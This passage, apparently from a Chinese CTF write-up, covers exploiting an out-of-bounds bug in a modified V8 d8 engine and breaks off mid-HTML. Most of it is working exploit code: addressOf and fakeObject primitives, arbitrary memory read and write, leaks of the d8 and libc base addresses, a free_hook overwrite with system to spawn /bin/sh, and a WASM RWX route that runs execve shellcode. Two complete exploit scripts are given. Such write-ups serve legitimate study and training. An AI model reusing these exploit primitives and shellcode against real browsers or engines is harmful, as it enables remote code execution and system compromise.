 <span class="number">90</span>             nop</span><br><span class="line"><span class="number">0x56405caec79b</span>    <span class="number">1b</span>  <span class="number">90</span>             nop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Safepoints (size = <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">RelocInfo (size = <span class="number">2</span>)</span><br><span class="line"><span class="number">0x1c3656069c2</span>  off heap target</span><br></pre></td></tr></table></figure>
<ul>
<li>可以通过这里来泄露 <code>pro_base</code></li>
<li>然后利用同样的方法来泄露 <code>libc_base</code></li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pro_base = leak_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak_addr : &quot;</span> + hex(leak_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] d8 base : &quot;</span> + hex(pro_base));</span><br><span class="line"><span class="keyword">var</span> libc_start_main_got = pro_base + <span class="number">0x12a47b0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_start_main = RAA(libc_start_main_got);</span><br><span class="line"><span class="keyword">var</span> libc_base = libc_start_main - <span class="number">0x23f90n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] __libc_start_main: &quot;</span> + hex(libc_start_main));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc base : &quot;</span> + hex(libc_base));</span><br></pre></td></tr></table></figure>
<p>最后在 <code>free_hook</code> 中写入 <code>system</code> 就可以了</p>
<p>另外，还有一种不需要进行泄露，直接注入 shellcode 的方法： </p>
<ul>
<li>通过 WASM，能得到一块 RWX 的内存，里面放着WASM的二进制代码</li>
<li>将 shellcode 写入到这块内存，再调用 WASM 接口时，就会执行 shellcode 了 </li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line">    <span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">10</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> funcAsm = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> addressFasm = addressOf(funcAsm);</span><br><span class="line"><span class="keyword">var</span> sharedInfo = RAA(addressFasm+<span class="number">0x18n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> functionData = RAA(sharedInfo+<span class="number">0x8n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> instanceAddr = RAA(functionData+<span class="number">0x10n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="keyword">var</span> memoryRWX = RAA(instanceAddr+<span class="number">0x88n</span>-<span class="number">0x1n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Get RWX memory : &quot;</span> + hex(memoryRWX));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">        <span class="number">0x2fbb485299583b6an</span>,</span><br><span class="line">        <span class="number">0x5368732f6e69622fn</span>,</span><br><span class="line">        <span class="number">0x050f5e5457525f54n</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">56</span>);</span><br><span class="line"><span class="keyword">var</span> dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> - <span class="number">0x1n</span>;</span><br><span class="line">WAA(bufBackStore, memoryRWX);</span><br><span class="line">dataview.setFloat64(<span class="number">0</span>, i2f(shellcode[<span class="number">0</span>]), <span class="literal">true</span>);</span><br><span class="line">dataview.setFloat64(<span class="number">8</span>, i2f(shellcode[<span class="number">1</span>]), <span class="literal">true</span>);</span><br><span class="line">dataview.setFloat64(<span class="number">16</span>, i2f(shellcode[<span class="number">2</span>]), <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">funcAsm();</span><br></pre></td></tr></table></figure>
<ul>
<li>这是一个比较套路的过程</li>
</ul>
<p>完整 exp：</p>
<ul>
<li>不稳定泄漏：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">yhellow</span>:<span class="string">&quot;yhellow&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> mapFloatArray = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> mapObjArray = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = target;          </span><br><span class="line">    objArray.oob(mapFloatArray);    </span><br><span class="line">                                   </span><br><span class="line">    <span class="keyword">let</span> ret = objArray[<span class="number">0</span>];          </span><br><span class="line">    objArray.oob(mapObjArray);      </span><br><span class="line">    <span class="keyword">return</span> f2i(ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = target;        </span><br><span class="line">    floatArray.oob(mapObjArray);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(mapFloatArray);  </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + x.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArrayAddr = addressOf(floatArray);</span><br><span class="line"><span class="keyword">var</span> floatArrayElement = floatArrayAddr - <span class="number">0x28n</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x03d9b124ecc1 0x3d9b124ece9</span></span><br><span class="line"><span class="comment">0x3d9b124ecc1-&gt;0x3d9b124ece9 is 0x28 bytes (0x5 words)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = floatArrayElement + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fakeArray = fakeObject(i2f(fakeArrayAddr));</span><br><span class="line">floatArray[<span class="number">0</span>] = mapFloatArray;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RAA</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> +<span class="number">0x1n</span>); </span><br><span class="line">    <span class="keyword">let</span> data = fakeArray[<span class="number">0</span>];     </span><br><span class="line">    <span class="keyword">return</span> f2i(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> -<span class="number">0x1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAA</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>); </span><br><span class="line">    fakeArray[<span class="number">0</span>] = i2f(value);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAADataview</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WAA(bufBackStore, addr);</span><br><span class="line">    dataView.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code = RAA(addressOf(floatArray.constructor)-<span class="number">0x1n</span>+<span class="number">0x30n</span>); </span><br><span class="line"><span class="keyword">var</span> leak_addr = RAA(code-<span class="number">0x1n</span>+<span class="number">0x40n</span>) &gt;&gt; <span class="number">16n</span>; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x556d00f65780 0x556cfff9d000</span></span><br><span class="line"><span class="comment">0x556d00f65780-&gt;0x556cfff9d000 is -0xfc8780 bytes (-0x1f90f0 words)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> pro_base = leak_addr - <span class="number">0xfc8780n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] leak_addr : &quot;</span> + hex(leak_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] d8 base : &quot;</span> + hex(pro_base));</span><br><span class="line"><span class="keyword">var</span> libc_start_main_got = pro_base + <span class="number">0x12a47b0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_start_main = RAA(libc_start_main_got);</span><br><span class="line"><span class="keyword">var</span> libc_base = libc_start_main - <span class="number">0x23f90n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] __libc_start_main: &quot;</span> + hex(libc_start_main));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] libc base : &quot;</span> + hex(libc_base));</span><br><span class="line"><span class="keyword">var</span> free_hook = libc_base + <span class="number">0x1eee48n</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] free_hook : &quot;</span> + hex(free_hook));</span><br><span class="line">system= libc_base + <span class="number">0x52290n</span>;</span><br><span class="line">WAADataview(free_hook, system);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwnYou</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//let cmd = &quot;gnome-calculator;&quot;;</span></span><br><span class="line">    <span class="keyword">let</span> cmd = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">pwnYou();   </span><br><span class="line"></span><br><span class="line">WAADataview(free_hook, <span class="number">0x0n</span>);  </span><br></pre></td></tr></table></figure>
<ul>
<li>稳定泄漏：</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="attr">yhellow</span>:<span class="string">&quot;yhellow&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.11</span>, <span class="number">2.22</span>, <span class="number">3.33</span>];</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> mapFloatArray = floatArray.oob();</span><br><span class="line"><span class="keyword">var</span> mapObjArray = objArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    objArray[<span class="number">0</span>] = target;          </span><br><span class="line">    objArray.oob(mapFloatArray);    </span><br><span class="line">                                   </span><br><span class="line">    <span class="keyword">let</span> ret = objArray[<span class="number">0</span>];          </span><br><span class="line">    objArray.oob(mapObjArray);      </span><br><span class="line">    <span class="keyword">return</span> f2i(ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">target</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">0</span>] = target;        </span><br><span class="line">    floatArray.oob(mapObjArray);    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> ret = floatArray[<span class="number">0</span>];</span><br><span class="line">    floatArray.oob(mapFloatArray);  </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buffer);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = x;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">x</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + x.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> floatArrayAddr = addressOf(floatArray);</span><br><span class="line"><span class="keyword">var</span> floatArrayElement = floatArrayAddr - <span class="number">0x28n</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; distance 0x03d9b124ecc1 0x3d9b124ece9</span></span><br><span class="line"><span class="comment">0x3d9b124ecc1-&gt;0x3d9b124ece9 is 0x28 bytes (0x5 words)</span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="keyword">var</span> fakeArrayAddr = floatArrayElement + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fakeArray = fakeObject(i2f(fakeArrayAddr));</span><br><span class="line">floatArray[<span class="number">0</span>] = mapFloatArray;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RAA</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> +<span class="number">0x1n</span>); </span><br><span class="line">    <span class="keyword">let</span> data = fakeArray[<span class="number">0</span>];     </span><br><span class="line">    <span class="keyword">return</span> f2i(data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> dataBuf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> dataView = <span class="keyword">new</span> <span class="built_in">DataView</span>(dataBuf);</span><br><span class="line"><span class="keyword">var</span> bufBackStore = addressOf(dataBuf) + <span class="number">0x20n</span> -<span class="number">0x1n</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAA</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    floatArray[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>); </span><br><span class="line">    fakeArray[<span class="number">0</span>] = i2f(value);   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WAADataview</span>(<span class="params">addr, value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WAA(bufBackStore, addr);</span><br><span class="line">    dataView.setFloat64(<span class="number">0</span>, i2f(value), <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> objAddr = addressOf(obj);</span><br><span class="line"><span class="keyword">var</span> searchBase = objAddr-<span class="number">0x8000n</span>-<span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> leak_addr = <span class="number">0xdeadbeefn</span>;</span><br><span class="line"><span class="keyword">var</span> pro_base = <span class="number">0xdeadbeefn</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">let</span> push_rbp = RAA(searchBase);</span><br><span class="line">    <span class="keyword">if</span>((push_rbp &amp; <span class="number">0xfffn</span>) == <span class="number">0x8b0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        60f:3078│  0x3553ea18a218 —▸ 0x55b0ea5048b0 ◂— push   rbp</span></span><br><span class="line"><span class="comment">        610:3080│  0x3553ea18a220 —▸ 0x2c5438080b71 ◂— 0x200002c54380801</span></span><br><span class="line"><span class="comment">        611:3088│  0x3553ea18a228 —▸ 0x55b0ea5048b0 ◂— push   rbp</span></span><br><span class="line"><span class="comment">        612:3090│  0x3553ea18a230 —▸ 0x17dca8789009 ◂— 0x700002c54380801</span></span><br><span class="line"><span class="comment">        */</span> </span><br><span class="line">        <span class="keyword">let</span> push_rbp2 = RAA(push_rbp);</span><br><span class="line">        <span class="keyword">if</span> (push_rbp2 == <span class="number">0x56415741e5894855n</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            pwndbg&gt; x/xg 0x55b0ea5048b0</span></span><br><span class="line"><span class="comment">            0x55b0ea5048b0 &lt;v8::(anonymous namespace)::WebAssemblyInstantiate(v8::FunctionCallbackInfo&lt;v8::Value&gt; const&amp;)&gt;:	0x56415741e5894855</span></span><br><span class="line"><span class="comment">            */</span> </span><br><span class="line">            leak_addr = push_rbp;</span><br><span class="line">            pro_base = leak_addr - <span class="number">0xe618b0n</span>;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            pwndbg&gt; distance 0x55b0e96a3000 0x55b0ea5048b0</span></span><br><span class="line"><span class="comment">            0x55b0e96a3000-&gt;0x55b0ea5048b0 is 0xe618b0 bytes (0x1cc316 words)</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="built_in">console</span>.log(hex(searchBase) + <span class="string">&quot; -&gt; &quot;</span> +hex(leak_addr));</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;[*] d8 base : &quot;</span> + hex(pro_base));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    searchBase += <span class="number">8n</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">pwndbg&gt; telescope 0x12a47b0+0x5634968b1000</span></span><br><span class="line"><span class="comment">00:0000│  0x563497b557b0 —▸ 0x7f80d77a4f90 (__libc_start_main) ◂— endbr64 </span></span><br><span class="line"><span class="comment">*/</span> </span><br><span 